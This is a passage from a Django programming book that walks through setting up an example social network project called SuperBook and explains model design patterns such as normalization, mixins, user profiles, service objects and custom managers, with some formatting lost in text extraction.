python-openid, which is not actively maintained or unapproved    Non-Python dependencies: Some packages might have non-Python   dependencies, such as Redis or Node.js, which have deployment overheads    Not reusable: Many of our own apps were not used because they were not   very easy to reuse or were not written to be reusable  None of these packages are bad. They just don't meet our needs for now. They   might be useful for a different project. In our case, the built-in Django auth app   was good enough.  On the other hand, you might prefer to use a third-party app for some of the  following reasons:     Too hard to get right: Do your model's instances need to form a tree?    Use django-mptt for a database-efficient implementation     Best or recommended app for the job: This changes over time but packages   such as django-redis are the most recommended for their use case     Missing batteries: Many feel that packages such as django-model-utils   and django-extensions should have been part of the framework     Minimal dependencies: This is always good in my book  So, should you reuse apps and save time or write a new custom app? I would  recommend that you try a third-party app in a sandbox. If you are an intermediate  Django developer, then the next section will tell you how to try packages in a sandbox.  [ 522 ]  Application Design   My app sandbox From time to time, you will come across several blog posts listing the "must-have  Django packages". However, the best way to decide whether a package is appropriate  for your project is Prototyping.  Even if you have created a Python virtual environment for development, trying all  these packages and later discarding them can litter your environment. So, I usually  end up creating a separate virtual environment named "sandbox" purely for trying  such apps. Then, I build a small project to understand how easy it is to use.  Later, if I am happy with my test drive of the app, I create a branch in my project  using a version control tool such as Git to integrate the app. Then, I continue with  coding and running tests in the branch until the necessary features are added.  Finally, this branch will be reviewed and merged back to the mainline  sometimes  called master  branch.  Which packages made it? To illustrate the process, our SuperBook project can be roughly broken down into the  following apps  not the complete list :     Authentication  built-in django.auth : This app handles user signups, login,      Accounts  custom : This app provides additional user profile information    Posts  custom : This app provides posts and comments functionality    Pows  custom : This app tracks how many "pows"  upvotes or likes  any item   and logout  gets     Bootstrap forms  crispy-forms : This app handles the form layout and styling  Here, an app has been marked to be built from scratch  tagged "custom"  or the  third-party Django app that we would be using. As the project progresses, these  choices might change. However, this is good enough for a start.  Before starting the project While preparing a development environment, make sure that you have the following  in place:     A fresh Python virtual environment: Python 3 includes the venv module  or you can install virtualenv. Both of them prevent polluting your global  Python library.  [ 523 ]  Chapter 2      Version control: Always use a version control tool such as Git or Mercurial.   They are life savers. You can also make changes much more confidently   and fearlessly.     Choose a project template: Django's default project template is not   the only option. Based on your needs try others such as twoscoops   https:  github.com twoscoops django-twoscoops-project    or edge  https:  github.com arocks edge .     Deployment pipeline: I usually worry about this a bit later, but having   an easy deployment process helps to show early progress. I prefer Fabric   or Ansible.  SuperBook – your mission, should you  choose to accept it This book believes in a practical and pragmatic approach of demonstrating Django  design patterns and the best practices through examples. For consistency, all our  examples will be about building a social network project called SuperBook.  SuperBook focusses exclusively on the niche and often neglected market segment   of people with exceptional super powers. You are one of the developers in a team  comprised of other developers, web designers, a marketing manager, and a   project manager.  The project will be built in the latest version of Python  Version 3.4  and Django   Version 1.7  at the time of writing. Since the choice of Python 3 can be a   contentious topic, it deserves a fuller explanation.  Why Python 3? While the development of Python 3 started in 2006, its first release, Python 3.0,  was released on December 3, 2008. The main reasons for a backward incompatible  version were—switching to Unicode for all strings, increased use of iterators,  cleanup of deprecated features such as old-style classes, and some new syntactic  additions such as the nonlocal statement.  The reaction to Python 3 in the Django community was rather mixed. Even though  the language changes between Version 2 and 3 were small  and over time, reduced ,  porting the entire Django codebase was a significant migration effort.  On February 13, Django 1.5 became the first version to support Python 3. Developers  have clarified that, in future, Django will be written for Python 3 with an aim to be  backward compatible to Python 2.  [ 524 ]  Application Design   For this book, Python 3 was ideal for the following reasons:     Better syntax: This fixes a lot of ugly syntaxes, such as izip, xrange, and  __unicode__, with the cleaner and more straightforward zip, range, and  __str__.     Sufficient third-party support: Of the top 200 third-party libraries, more    than 80 percent have Python 3 support.     No legacy code: We are creating a new project, rather than dealing with   legacy code that needs to support an older version.     Default in modern platforms: This is already the default Python    interpreter in Arch Linux. Ubuntu and Fedora plan to complete the   switch in a future release. It is easy: From a Django development point of view, there are very   few changes, and they can all be learnt in a few minutes.      The last point is important. Even if you are using Python 2, this book will   serve you fine. Read Appendix A to understand the changes. You will need   to make only minimal adjustments to backport the example code.  Starting the project This section has the installation instructions for the SuperBook project, which  contains all the example code used in this book. Do check the project's README   file for the latest installation notes. It is recommended that you create a fresh  directory, superbook, first that will contain the virtual environment and   the project source code.  Ideally, every Django project should be in its own separate virtual environment.  This makes it easy to install, update, and delete packages without affecting other  applications. In Python 3.4, using the built-in venv module is recommended since   it also installs pip by default:  $ python3 -m venv sbenv  $ source sbenv bin activate  $ export PATH="`pwd` sbenv local bin:$PATH"  These commands should work in most Unix-based operating systems. For installation  instructions on other operating systems or detailed steps please refer to the README  file at the Github repository: https:  github.com DjangoPatternsBook  superbook. In the first line, we are invoking the Python 3.4 executable as python3;   do confirm if this is correct for your operating system and distribution.  [ 525 ]  Chapter 2   The last export command might not be required in some cases. If running pip  freeze lists your system packages rather than being empty, then you will need   to enter this line.  Before starting your Django project, create a fresh virtual environment.  Next, clone the example project from GitHub and install the dependencies:  $ git clone https:  github.com DjangoPatternsBook superbook.git  $ cd superbook  $ pip install -r requirements.txt  If you would like to take a look at the finished SuperBook website, just run migrate  and start the test server:  $ cd final  $ python manage.py migrate  $ python manage.py createsuperuser  $ python manage.py runserver  In Django 1.7, the migrate command has superseded the syncdb command.   We also need to explicitly invoke the createsuperuser command to create a   super user so that we can access the admin.  You can navigate to http:  127.0.0.1:8000 or the URL indicated in your   terminal and feel free to play around with the site.  Summary Beginners often underestimate the importance of a good requirements-gathering  process. At the same time, it is important not to get bogged down with the details,  because programming is inherently an exploratory process. The most successful  projects spend the right amount of time preparing and planning before   development so that it yields the maximum benefits.  We discussed many aspects of designing an application, such as creating interactive  mockups or dividing it into reusable components called apps. We also discussed   the steps to set up SuperBook, our example project.  In the next chapter, we will take a look at each component of Django in detail and  learn the design patterns and best practices around them.  [ 526 ]  Application Design   Models  In this chapter, we will discuss the following topics:     The importance of models    Class diagrams     Model structural patterns    Model behavioral patterns    Migrations  M is bigger than V and C In Django, models are classes that provide an object-oriented way of dealing with  databases. Typically, each class refers to a database table and each attribute refers  to a database column. You can make queries to these tables using an automatically  generated API.  Models can be the base for many other components. Once you have a model, you   can rapidly derive model admins, model forms, and all kinds of generic views. In  each case, you would need to write a line of code or two, just so that it does not   seem too magical.  Also, models are used in more places than you would expect. This is because Django  can be run in several ways. Some of the entry points of Django are as follows:     The familiar web request-response flow    Django interactive shell    Management commands    Test scripts    Asynchronous task queues such as Celery  [ 527 ]   In almost all these cases, the model modules would get imported  as a part of  django.setup   . Hence, it is best to keep your models free from any unnecessary  dependencies or to import any other Django components such as views.  In short, designing your models properly is quite important. Now let's get started  with the SuperBook model design.  The Brown Bag Lunch Author's Note: The progress of the SuperBook project will appear in a box  like this. You may skip the box but you will miss the insights, experiences,  and drama of working in a web application project. Steve's first week with his client, the SuperHero Intelligence and  Monitoring or S.H.I.M. for short, was a mixed bag. The office was  incredibly futuristic but getting anything done needed a hundred  approvals and sign-offs. Being the lead Django developer, Steve had finished setting up a  mid-sized development server hosting four virtual machines over  two days. The next morning, the machine itself had disappeared. A  washing machine-sized robot nearby said that it had been taken to   the forensic department due to unapproved software installations. The CTO, Hart was, however, of great help. He asked the machine  to be returned in an hour with all the installations intact. He had  also sent pre-approvals for the SuperBook project to avoid any such  roadblocks in future. Later that afternoon, Steve was having a brown-bag lunch with   him. Dressed in a beige blazer and light blue jeans, Hart arrived   well in time. Despite being taller than most people and having a clean- shaven head, he seemed cool and approachable. He asked if Steve   had checked out the previous attempt to build a superhero database   in the sixties. "Oh yes, the Sentinel project, right?" said Steve. "I did. The database  seemed to be designed as an Entity-Attribute-Value model, something  that I consider an anti-pattern. Perhaps they had very little idea about  the attributes of a superhero those days." Hart almost winced at the  last statement. In a slightly lowered voice, he said, "You are right, I  didn't. Besides, they gave me only two days to design the whole thing.  I believe there was literally a nuclear bomb ticking somewhere." Steve's mouth was wide open and his sandwich had frozen at its  entrance. Hart smiled. "Certainly not my best work. Once it crossed  about a billion entries, it took us days to run any kind of analysis  on that damn database. SuperBook would zip through that in mere  seconds, right?" Steve nodded weakly. He had never imagined that there would be  around a billion superheroes in the first place.  [ 528 ]  Models   The model hunt Here is a first cut at identifying the models in SuperBook. Typical to an early  attempt, we have represented only the essential models and their relationships   in the form of a class diagram:  Let's forget models for a moment and talk in terms of the objects we are modeling.  Each user has a profile. A user can make several comments or several posts. A Like  can be related to a single user post combination.  Drawing a class diagram of your models like this is recommended. Some attributes  might be missing at this stage but you can detail them later. Once the entire project   is represented in the diagram, it makes separating the apps easier.  Here are some tips to create this representation:     Boxes represent entities, which become models.    Nouns in your write-up typically end up as entities.  [ 529 ]  Chapter 3      Arrows are bi-directional and represent one of the three types of relationships   in Django: one-to-one, one-to-many  implemented with Foreign Keys , and  many-to-many.     The field denoting the one-to-many relationship is defined in the model   on the Entity-relationship model  ER-model . In other words, the star is  where the Foreign Key gets declared.  The class diagram can be mapped into the following Django code  which will be  spread across several apps :  class Profile models.Model :     user = models.OneToOneField User   class Post models.Model :     posted_by = models.ForeignKey User   class Comment models.Model :     commented_by = models.ForeignKey User      for_post = models.ForeignKey Post   class Like models.Model :     liked_by = models.ForeignKey User      post = models.ForeignKey Post   Later, we will not reference the User directly but use the more general settings. AUTH_USER_MODEL instead.  Splitting models.py into multiple files Like most components of Django, a large models.py file can be split up into multiple  files within a package. A package is implemented as a directory, which can contain  multiple files, one of which must be a specially named file called __init__.py.  All definitions that can be exposed at package level must be defined in __init__. py with global scope. For example, if we split models.py into individual classes, in  corresponding files inside models subdirectory such as postable.py, post.py,   and comment.py, then the __init__.py package will look like:  from postable import Postable from post import Post from comment import Comment  Now you can import models.Post as before.  Any other code in the __init__.py package will be run when the package is  imported. Hence, it is the ideal place for any package-level initialization code.  [ 530 ]  Models   Structural patterns This section contains several design patterns that can help you design and structure  your models.  Patterns – normalized models Problem: By design, model instances have duplicated data that cause   data inconsistencies. Solution: Break down your models into smaller models through normalization.  Connect these models with logical relationships between them.  Problem details Imagine if someone designed our Post table  omitting certain columns  in the  following way:  Superhero Name Message Captain Temper Professor English Captain Temper Capt. Temper  Has this posted yet? It should be 'Is' not 'Has'. Has this posted yet? Has this posted yet?  Posted on 2012 07 07 07:15 2012 07 07 07:17 2012 07 07 07:18 2012 07 07 07:19  I hope you noticed the inconsistent superhero naming in the last row  and captain's  consistent lack of patience .  If we were to look at the first column, we are not sure which spelling is   correct—Captain Temper or Capt. Temper. This is the kind of data redundancy   we would like to eliminate through normalization.  Solution details Before we take a look at the fully normalized solution, let's have a brief primer on  database normalization in the context of Django models. Three steps of normalization Normalization helps you efficiently store data. Once your models are fully normalized,  they will not have redundant data, and each model should contain data that is only  logically related to it.  [ 531 ]  Chapter 3   To give a quick example, if we were to normalize the Post table so that we can  unambiguously refer to the superhero who posted that message, then we need to  isolate the user details in a separate table. Django already creates the user table   by default. So, you only need to refer to the ID of the user who posted the message   in the first column, as shown in the following table:  User ID 12 8 12 12  Message Has this posted yet? It should be 'Is' not 'Has'. Has this posted yet? Has this posted yet?  Posted on 2012 07 07 07:15 2012 07 07 07:17 2012 07 07 07:18 2012 07 07 07:19  Now, it is not only clear that there were three messages posted by the same user   with an arbitrary user ID , but we can also find that user's correct name by looking  up the user table.  Generally, you will design your models to be in their fully normalized form and then  selectively denormalize them for performance reasons. In databases, Normal Forms  are a set of guidelines that can be applied to a table to ensure that it is normalized.  Commonly found normal forms are first, second, and third normal forms, although  they could go up to the fifth normal form.  In the next example, we will normalize a table and create the corresponding Django  models. Imagine a spreadsheet called 'Sightings' that lists the first time someone spots  a superhero using a power or superhuman ability. Each entry mentions the known  origins, super powers, and location of first sighting, including latitude and longitude.  Name Blitz  Origin Alien  Hexa  Scientist  Traveller  Billionaire  Power Freeze Flight Telekinesis Flight Time travel  First Used At  Lat, Lon, Country, Time  +40.75, -73.99; USA; 2014 07 03 23:12 +34.05, -118.24; USA; 2013 03 12 11:30 +35.68, +139.73; Japan; 2010 02 17 20:15 +31.23, +121.45; China; 2010 02 19 20:30 +43.62, +1.45, France; 2010 11 10 08:20  The preceding geographic data has been extracted from http:  www.golombek. com locations.html. First normal form  1NF  To confirm to the first normal form, a table must have:     No attribute  cell  with multiple values  [ 532 ]  Models      A primary key defined as a single column or a set of columns     composite key   Let's try to convert our spreadsheet into a database table. Evidently,   our 'Power' column breaks the first rule.  The updated table here satisfies the first normal form. The primary key  marked with  a *  is a combination of 'Name' and 'Power', which should be unique for each row.   Name*  Origin  Power*  Latitude  Longitude  Country  Time  Blitz  Blitz  Hexa  Hexa  Alien  Alien  Freeze  +40.75170  -73.99420  Flight  +40.75170  -73.99420  USA  USA  Scientist  Telekinesis  +35.68330  +139.73330  Japan  Scientist  Flight  +35.68330  +139.73330  Japan  Traveller  Billionaire Time  travel  +43.61670  +1.45000  France  2014 07 03  23:12 2013 03 12  11:30 2010 02 17  20:15 2010 02 19  20:30 2010 11 10  08:20  Second normal form or 2NF The second normal form must satisfy all the conditions of the first normal form.   In addition, it must satisfy the condition that all non-primary key columns must be  dependent on the entire primary key. In the previous table, notice that 'Origin' depends only on the superhero, that is,  'Name'. It doesn't matter which Power we are talking about. So, Origin is not entirely  dependent on the composite primary key—Name and Power. Let's extract just the origin information into a separate table called 'Origins' as   shown here:  Name* Blitz Hexa Traveller  Origin Alien Scientist Billionaire  [ 533 ]  Chapter 3   Now our Sightings table updated to be compliant to the second normal form looks  like this:  Name*  Power*  Latitude  Longitude  Country Time  Blitz  Blitz  Hexa  Hexa  Freeze  Flight  +40.75170  -73.99420  +40.75170  -73.99420  USA  USA  2014 07 03 23:12  2013 03 12 11:30  Telekinesis  +35.68330  +139.73330  Japan  2010 02 17 20:15  Flight  +35.68330  +139.73330  Japan  2010 02 19 20:30  Traveller  Time travel  +43.61670  +1.45000  France  2010 11 10 08:20  Third normal form or 3NF In third normal form, the tables must satisfy the second normal form and should  additionally satisfy the condition that all non-primary key columns must be directly  dependent on the entire primary key and must be independent of each other. Think about the Country column for a moment. Given the Latitude and Longitude,   you can easily derive the Country column. Even though the country where a  superpowers was sighted is dependent on the Name-Power composite primary   key it is only indirectly dependent on them.  So, let's separate the location details into a separate Countries table as follows:  Location ID Latitude* 1 +40.75170 +35.68330 2 3 +43.61670  Longitude* -73.99420 +139.73330 +1.45000  Country USA Japan France  Now our Sightings table in its third normal form looks like this:  User ID* 2 2 4  Power* Freeze Flight Telekinesis  Location ID Time 1 1 2  2014 07 03 23:12 2013 03 12 11:30 2010 02 17 20:15  [ 534 ]  Models   User ID* 4 7  Power* Flight Time travel  Location ID Time 2 3  2010 02 19 20:30 2010 11 10 08:20  As before, we have replaced the superhero's name with the corresponding User ID  that can be used to reference the user table. Django models We can now take a look at how these normalized tables can be represented as   Django models. Composite keys are not directly supported in Django. The solution  used here is to apply the surrogate keys and specify the unique_together property  in the Meta class:  class Origin models.Model :     superhero = models.ForeignKey settings.AUTH_USER_MODEL      origin = models.CharField max_length=100   class Location models.Model :     latitude = models.FloatField       longitude = models.FloatField       country = models.CharField max_length=100       class Meta:         unique_together =  "latitude", "longitude"   class Sighting models.Model :     superhero = models.ForeignKey settings.AUTH_USER_MODEL      power = models.CharField max_length=100      location = models.ForeignKey Location      sighted_on = models.DateTimeField        class Meta:         unique_together =  "superhero", "power"   Performance and denormalization Normalization can adversely affect performance. As the number of models increase,  the number of joins needed to answer a query also increase. For instance, to find   the number of superheroes with the Freeze capability in USA, you will need to join  four tables. Prior to normalization, any information can be found by querying a  single table.  [ 535 ]  Chapter 3   You should design your models to keep the data normalized. This will maintain  data integrity. However, if your site faces scalability issues, then you can selectively  derive data from those models to create denormalized data.  Best Practice Normalize while designing but denormalize while optimizing.  For instance, if counting the sightings in a certain country is very common, then  add it as an additional field to the Location model. Now, you can include the other  queries using Django  object-relational mapping  ORM, unlike a cached value. However, you need to update this count each time you add or remove a sighting.  You need to add this computation to the save method of Sighting, add a signal  handler, or even compute using an asynchronous job.  If you have a complex query spanning several tables, such as a count of superpowers  by country, then you need to create a separate denormalized table. As before, we  need to update this denormalized table every time the data in your normalized  models changes.  Denormalization is surprisingly common in large websites because it is tradeoff  between speed and space. Today, space is cheap but speed is crucial to user  experience. So, if your queries are taking too long to respond, then you might   want to consider it. Should we always normalize? Too much normalization is not necessarily a good thing. Sometimes, it can introduce  an unnecessary table that can complicate updates and lookups. For example, your User model might have several fields for their home address. Strictly  speaking, you can normalize these fields into an Address model. However, in many  cases, it would be unnecessary to introduce an additional table to the database.  Rather than aiming for the most normalized design, carefully weigh each  opportunity to normalize and consider the tradeoffs before refactoring.  Pattern – model mixins Problem: Distinct models have the same fields and or methods duplicated violating  the DRY principle. Solution: Extract common fields and methods into various reusable model mixins.  [ 536 ]  Models   Problem details While designing models, you might find certain common attributes or behaviors  shared across model classes. For example, a Post and Comment model needs to keep  track of its created date and modified date. Manually copy-pasting the fields and  their associated method is not a very DRY approach.  Since Django models are classes, object-oriented approaches such as composition   and inheritance are possible solutions. However, compositions  by having a   property that contains an instance of the shared class  will need an additional   level of indirection to access fields.  Inheritance can get tricky. We can use a common base class for Post and Comments.  However, there are three kinds of inheritance in Django: concrete, abstract,   and proxy. Concrete inheritance works by deriving from the base class just like you normally  would in Python classes. However, in Django, this base class will be mapped into   a separate table. Each time you access base fields, an implicit join is needed. This  leads to horrible performance.  Proxy inheritance can only add new behavior to the parent class. You cannot add  new fields. Hence, it is not very useful for this situation.  Finally, we are left with abstract inheritance.   Solution details Abstract base classes are elegant solutions used to share data and behavior among  models. When you define an abstract class, it does not create any corresponding table  in the database. Instead, these fields are created in the derived non-abstract classes.  Accessing abstract base class fields doesn't need a JOIN statement. The resulting  tables are also self-contained with managed fields. Due to these advantages, most  Django projects use abstract base classes to implement common fields or methods.  Limitations of abstract models are as follows:     They cannot have a Foreign Key or many-to-many field from another model    They cannot be instantiated or saved    They cannot be directly used in a query since it doesn't have a manager  [ 537 ]  Chapter 3   Here is how the post and comment classes can be initially designed with an abstract  base class:  class Postable models.Model :     created = models.DateTimeField auto_now_add=True      modified = models.DateTimeField auto_now=True      message = models.TextField max_length=500       class Meta:         abstract = True  class Post Postable :     ...  class Comment Postable :      ...  To turn a model into an abstract base class, you will need to mention abstract =  True in its inner Meta class. Here, Postable is an abstract base class. However, it is  not very reusable.  In fact, if there was a class that had just the created and modified field, then   we can reuse that timestamp functionality in nearly any model needing a   timestamp. In such cases, we usually define a model mixin.  Model mixins Model mixins are abstract classes that can be added as a parent class of a model.  Python supports multiple inheritances, unlike other languages such as Java.   Hence, you can list any number of parent classes for a model.  Mixins ought to be orthogonal and easily composable. Drop in a mixin to the list   of base classes and they should work. In this regard, they are more similar in  behavior to composition rather than inheritance.  Smaller mixins are better. Whenever a mixin becomes large and violates the Single  Responsibility Principle, consider refactoring it into smaller classes. Let a mixin do  one thing and do it well.  [ 538 ]  Models   In our previous example, the model mixin used to update the created and   modified time can be easily factored out, as shown in the following code:  class TimeStampedModel models.Model :     created = models.DateTimeField auto_now_add=True      modified = models.DateTimeField auto_now =True       class Meta:         abstract = True  class Postable TimeStampedModel :     message = models.TextField max_length=500      ...       class Meta:         abstract = True  class Post Postable :     ...  class Comment Postable :     ...  We have two base classes now. However, the functionality is clearly separated.   The mixin can be separated into its own module and reused in other contexts.  Pattern – user profiles Problem: Every website stores a different set of user profile details. However,  Django's built-in User model is meant for authentication details. Solution: Create a user profile class with a one-to-one relation with the user model.  Problem details Out of the box, Django provides a pretty decent User model. You can use it when   you create a super user or log in to the admin interface. It has a few basic fields,   such as full name, username, and e-mail.  [ 539 ]  Chapter 3   However, most real-world projects keep a lot more information about users, such  as their address, favorite movies, or their superpower abilities. From Django 1.5  onwards, the default User model can be extended or replaced. However, official   docs strongly recommend storing only authentication data even in a custom user  model  it belongs to the auth app, after all .  Certain projects need multiple types of users. For example, SuperBook can be used  by superheroes and non-superheroes. There might be common fields and some  distinctive fields based on the type of user.  Solution details The officially recommended solution is to create a user profile model. It should have  a one-to-one relation with your user model. All the additional user information is  stored in this model:  class Profile models.Model :     user = models.OneToOneField settings.AUTH_USER_MODEL,                                 primary_key=True   It is recommended that you set the primary_key explicitly to True to prevent  concurrency issues in some database backends such as PostgreSQL. The rest of the  model can contain any other user details, such as birthdate, favorite color, and so on.  While designing the profile model, it is recommended that all the profile detail fields  must be nullable or contain default values. Intuitively, we can understand that a user  cannot fill out all his profile details while signing up. Additionally, we will ensure  that the signal handler also doesn't pass any initial parameters while creating the  profile instance. Signals Ideally, every time a user model instance is created, a corresponding user profile  instance must be created as well. This is usually done using signals.  For example, we can listen for the post_save signal from the user model using   the following signal handler:   signals.py   from django.db.models.signals import post_save from django.dispatch import receiver from django.conf import settings   [ 540 ]  Models   from . import models  @receiver post_save, sender=settings.AUTH_USER_MODEL  def create_profile_handler sender, instance, created, **kwargs :     if not created:         return      Create the profile object, only if it is newly created     profile = models.Profile user=instance      profile.save    Note that the profile model has passed no additional initial parameters except for the  user instance.  Previously, there was no specific place for initializing the signal code. Typically, they  were imported or implemented in models.py  which was unreliable . However, with  app-loading refactor in Django 1.7, the application initialization code location is well  defined.  First, create a __init__.py package for your application to mention your app's  ProfileConfig:  default_app_config = "profiles.apps.ProfileConfig"  Next, subclass the ProfileConfig method in app.py and set up the signal in the  ready method:   app.py from django.apps import AppConfig  class ProfileConfig AppConfig :     name = "profiles"     verbose_name = 'User Profiles'      def ready self :         from . import signals  With your signals set up, accessing user.profile should return a Profile object to  all users, even the newly created ones. Admin Now, a user's details will be in two different places within the admin: the  authentication details in the usual user admin page and the same user's additional  profile details in a separate profile admin page. This gets very cumbersome.  [ 541 ]  Chapter 3   For convenience, the profile admin can be made inline to the default user admin by  defining a custom UserAdmin as follows:   admin.py from django.contrib import admin from .models import Profile from django.contrib.auth.models import User  class UserProfileInline admin.StackedInline :     model = Profile  class UserAdmin admin.UserAdmin :     inlines = [UserProfileInline]  admin.site.unregister User  admin.site.register User, UserAdmin   Multiple profile types Assume that you need several kinds of user profiles in your application. There   needs to be a field to track which type of profile the user has. The profile data itself  needs to be stored in separate models or a unified model.  An aggregate profile approach is recommended since it gives the flexibility to   change the profile types without loss of profile details and minimizes complexity.  In this approach, the profile model contains a superset of all profile fields from all  profile types.  For example, SuperBook will need a SuperHero type profile and an Ordinary    non-superhero  profile. It can be implemented using a single unified profile   model as follows:  class BaseProfile models.Model :     USER_TYPES =            0, 'Ordinary' ,          1, 'SuperHero' ,           user = models.OneToOneField settings.AUTH_USER_MODEL,                                 primary_key=True      user_type = models.IntegerField max_length=1, null=True,                                     choices=USER_TYPES      bio = models.CharField max_length=200, blank=True, null=True       def __str__ self :  [ 542 ]  Models           return "{}: {:.20}". format self.user, self.bio or ""   class SuperHeroProfile models.Model :     origin = models.CharField max_length=100, blank=True, null=True       class Meta:         abstract = True      class Meta:         abstract = True      class Meta:         abstract = True  class OrdinaryProfile models.Model :     address = models.CharField max_length=200, blank=True, null=True   class Profile SuperHeroProfile, OrdinaryProfile, BaseProfile :     pass  We grouped the profile details into several abstract base classes to separate concerns.  The BaseProfile class contains all the common profile details irrespective of the  user type. It also has a user_type field that keeps track of the user's active profile.  The SuperHeroProfile class and OrdinaryProfile class contain the profile details  specific to superhero and non-hero users respectively. Finally, the profile class  derives from all these base classes to create a superset of profile details.  Some details to take care of while using this approach are as follows:     All profile fields that belong to the class or its abstract bases classes    must be nullable or with defaults.     This approach might consume more database space per user but gives   immense flexibility.     The active and inactive fields for a profile type need to be managed    outside the model. Say, a form to edit the profile must show the   appropriate fields based on the currently active user type.  Pattern – service objects Problem: Models can get large and unmanageable. Testing and maintenance   get harder as a model does more than one thing. Solution: Refactor out a set of related methods into a specialized Service object.  [ 543 ]  Chapter 3   Problem details Fat models, thin views is an adage commonly told to Django beginners. Ideally,   your views should not contain anything other than presentation logic.  However, over time pieces of code that cannot be placed anywhere else tend to go  into models. Soon, models become a dump yard for the code.   Some of the tell-tale signs that your model can use a Service object are as follows:  1.   Interactions with external services, for example, checking whether the   user is eligible to get a SuperHero profile with a web service.  2.  Helper tasks that do not deal with the database, for example, generating    3.   a short URL or random captcha for a user. Involves a short-lived object without a database state, for example,   creating a JSON response for an AJAX call.  4.  Long-running tasks involving multiple instances such as Celery tasks.  Models in Django follow the Active Record pattern. Ideally, they encapsulate both  application logic and database access. However, keep the application logic minimal.  While testing, if we find ourselves unnecessarily mocking the database even while  not using it, then we need to consider breaking up the model class. A Service object  is recommended in such situations.  Solution details Service objects are plain old Python objects  POPOs  that encapsulate a 'service'   or interactions with a system. They are usually kept in a separate file named  services.py or utils.py.  For example, checking a web service is sometimes dumped into a model method   as follows:  class Profile models.Model :     ...      def is_superhero self :         url = "http:  api.herocheck.com ?q={0}".format                self.user.username          return webclient.get url   [ 544 ]  Models   This method can be refactored to use a service object as follows:  from .services import SuperHeroWebAPI      def is_superhero self :         return SuperHeroWebAPI.is_hero self.user.username   The service object can be now defined in services.py as follows:  API_URL = "http:  api.herocheck.com ?q={0}"  class SuperHeroWebAPI:     ...     @staticmethod     def is_hero username :         url =API_URL.format username          return webclient.get url   In most cases, methods of a Service object are stateless, that is, they perform the  action solely based on the function arguments without using any class properties.  Hence, it is better to explicitly mark them as static methods  as we have done   for is_hero .  Consider refactoring your business logic or domain logic out of models into service  objects. This way, you can use them outside your Django application as well.  Imagine there is a business reason to blacklist certain users from becoming   superhero types based on their username. Our service object can be easily   modified to support this:  class SuperHeroWebAPI:     ...     @staticmethod     def is_hero username :         blacklist = set ["syndrome", "kcka$$", "superfake"]          url =API_URL.format username          return username not in blacklist and webclient.get url   Ideally, service objects are self-contained. This makes them easy to test without  mocking, say, the database. They can be also easily reused.  In Django, time-consuming services are executed asynchronously using task queues  such as Celery. Typically, the Service Object actions are run as Celery tasks. Such  tasks can be run periodically or after a delay.  [ 545 ]  Chapter 3   Retrieval patterns This section contains design patterns that deal with accessing model properties or  performing queries on them.  Pattern – property field Problem: Models have attributes that are implemented as methods. However, these  attributes should not be persisted to the database. Solution: Use the property decorator on such methods.  Problem details Model fields store per-instance attributes, such as first name, last name, birthday,  and so on. They are also stored in the database. However, we also need to access  some derived attributes, such as full name or age.  They can be easily calculated from the database fields, hence need not be stored  separately. In some cases, they can just be a conditional check such as eligibility   for offers based on age, membership points, and active status.  A straightforward way to implement this is to define functions, such as get_age  similar to the following:  class BaseProfile models.Model :     birthdate = models.DateField       ...     def get_age self :         today = datetime.date.today           return  today.year - self.birthdate.year  - int               today.month, today.day  <              self.birthdate.month, self.birthdate.day    Calling profile.get_age   would return the user's age by calculating the  difference in the years adjusted by one based on the month and date.  However, it is much more readable  and Pythonic  to call it profile.age.  [ 546 ]  Models   Solution details Python classes can treat a function as an attribute using the property decorator.  Django models can use it as well. In the previous example, replace the function  definition line with:      @property     def age self :  Now, we can access the user's age with profile.age. Notice that the function's  name is shortened as well.  An important shortcoming of a property is that it is invisible to the ORM, just like  model methods are. You cannot use it in a QuerySet object. For example, this will  not work, Profile.objects.exclude age__lt=18 .  It might also be a good idea to define a property to hide the details of internal   classes. This is formally known as the Law of Demeter. Simply put, the law states  that you should only access your own direct members or "use only one dot".  For example, rather than accessing profile.birthdate.year, it is better to define  a profile.birthyear property. It helps you hide the underlying structure of the  birthdate field this way.  Best Practice Follow the law of Demeter, and use only one dot when accessing  a property.  An undesirable side effect of this law is that it leads to the creation of several  wrapper properties in the model. This could bloat up models and make them   hard to maintain. Use the law to improve your model's API and reduce coupling  wherever it makes sense.  Cached properties Each time we call a property, we are recalculating a function. If it is an expensive  calculation, we might want to cache the result. This way, the next time the property  is accessed, the cached value is returned.  from django.utils.functional import cached_property     ...     @cached_property     def full_name self :          Expensive operation e.g. external service call         return "{0} {1}".format self.firstname, self.lastname   [ 547 ]  Chapter 3   The cached value will be saved as a part of the Python instance. As long as the  instance exists, the same value will be returned.  As a failsafe mechanism, you might want to force the execution of the expensive  operation to ensure that stale values are not returned. In such cases, set a keyword  argument such as cached=False to prevent returning the cached value.  Pattern – custom model managers Problem: Certain queries on models are defined and accessed repeatedly   throughout the code violating the DRY principle. Solution: Define custom managers to give meaningful names to common queries.  Problem details Every Django model has a default manager called objects. Invoking objects. all  , will return all the entries for that model in the database. Usually, we are  interested in only a subset of all entries.  We apply various filters to find out the set of entries we need. The criterion to select  them is often our core business logic. For example, we can find the posts accessible   to the public by the following code:  public = Posts.objects.filter privacy="public"   This criterion might change in the future. Say, we might want to also check   whether the post was marked for editing. This change might look like this:  public = Posts.objects.filter privacy=POST_PRIVACY.Public,          draft=False   However, this change needs to be made everywhere a public post is needed.   This can get very frustrating. There needs to be only one place to define such  commonly used queries without 'repeating oneself'.  Solution details QuerySets are an extremely powerful abstraction. They are lazily evaluated only  when needed. Hence, building longer QuerySets by method-chaining  a form of  fluent interface  does not affect the performance.  In fact, as more filtering is applied, the result dataset shrinks. This usually reduces  the memory consumption of the result.  [ 548 ]  Models   A model manager is a convenient interface for a model to get its QuerySet object.   In other words, they help you use Django's ORM to access the underlying database.  In fact, managers are implemented as very thin wrappers around a QuerySet object.  Notice the identical interface:  >>> Post.objects.filter posted_by__username="a"   [ ,  ]  >>> Post.objects.get_queryset  .filter posted_by__username="a"   [ ,  ]  The default manager created by Django, objects, has several methods, such as all,  filter, or exclude that return QuerySets. However, they only form a low-level   API to your database.  Custom managers are used to create a domain-specific, higher-level API. This is   not only more readable but less affected by implementation details. Thus, you   are able to work at a higher level of abstraction closely modeled to your domain.  Our previous example for public posts can be easily converted into a custom  manager as follows:    managers.py from django.db.models.query import QuerySet  class PostQuerySet QuerySet :     def public_posts self :         return self.filter privacy="public"   PostManager = PostQuerySet.as_manager  This convenient shortcut for creating a custom manager from a QuerySet object  appeared in Django 1.7. Unlike other previous approaches, this PostManager   object is chainable like the default objects manager.  It sometimes makes sense to replace the default objects manager with our custom  manager, as shown in the following code:  from .managers import PostManager class Post Postable :     ...     